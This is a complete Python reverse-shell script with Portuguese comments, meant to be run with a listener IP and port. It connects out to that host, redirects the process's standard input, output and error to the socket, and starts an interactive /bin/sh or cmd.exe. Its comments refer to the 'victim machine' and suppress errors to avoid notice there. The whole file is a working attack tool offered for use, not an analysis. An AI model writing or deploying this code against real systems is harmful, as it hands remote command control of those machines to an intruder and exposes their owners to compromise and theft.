import socket
import subprocess
import os
import sys

# Shell reverso em TCP. Leve, prático e multiplataforma.
# Uso: python3 tcp_reverse_shell.py <IP_DO_LISTENER> <PORTA>

if len(sys.argv) != 3:
    print(f"Uso: python3 {sys.argv[0]} <IP_DO_LISTENER> <PORTA>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Redirecionamento dos descritores de arquivo (a mágica do reverse shell)
    # Pega o descritor do socket (s.fileno()) e o duplica para ser a entrada,
    # a saída e o erro padrão do processo.
    os.dup2(s.fileno(), 0) # stdin
    os.dup2(s.fileno(), 1) # stdout
    os.dup2(s.fileno(), 2) # stderr

    # Determina o shell a ser executado com base no sistema operacional.
    shell = '/bin/sh' if 'linux' in sys.platform else 'cmd.exe'
    
    # Inicia o processo do shell. A partir deste ponto, tudo que o shell
    # lê ou escreve irá passar pelo socket.
    subprocess.call([shell, "-i"])
except Exception:
    # Erros não são impressos para não poluir a máquina vítima.
    # Apenas tenta fechar e sair.
    pass